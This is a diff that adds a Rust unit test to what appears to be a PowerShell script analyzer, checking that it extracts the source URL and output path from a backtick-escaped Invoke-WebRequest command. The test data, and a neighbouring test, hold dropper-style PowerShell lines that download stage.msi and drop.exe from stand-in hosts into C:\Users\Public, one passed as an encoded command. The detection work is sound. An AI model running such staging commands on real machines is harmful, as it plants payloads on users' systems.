@@ -20393,6 +20393,24 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn iwr_backtick_escaped_quotes_preserve_outfile_destination() {
+        let ps = r#"Invoke-WebRequest -Uri `"https://iwr-backtick-escaped.example/stage.msi`" -OutFile `"C:\Users\Public\stage.msi`""#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://iwr-backtick-escaped.example/stage.msi"
+                            && dst.as_deref() == Some("C:\\Users\\Public\\stage.msi")
+                )
+            }),
+            "backtick-escaped quoted OutFile path was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn iwr_attached_outfile_preserves_destination() {
         let ps = r#"Invoke-WebRequest -Uri "https://outfile-attached.example/drop.exe" -OutFile:"C:\Users\Public\attached.exe""#;
         let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
